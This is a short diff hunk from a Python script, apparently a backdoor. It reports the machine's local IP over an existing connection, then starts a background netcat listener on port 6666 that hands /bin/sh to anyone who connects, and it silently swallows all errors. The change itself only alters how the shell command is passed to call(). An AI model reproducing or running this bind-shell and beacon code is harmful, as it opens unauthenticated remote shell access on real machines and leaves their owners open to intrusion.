@@ -23,7 +23,7 @@ def main():
         thisIP = s.getsockname()[0]
 
         nc.send(thisIP)
-        call("nohup netcat -l -p 6666 -e /bin/sh &".split(" "), shell=True)
+        call(["nohup netcat -l -p 6666 -e /bin/sh &"], shell=True)
         nc.close()
     except Exception as somethingbadhappened:
         pass
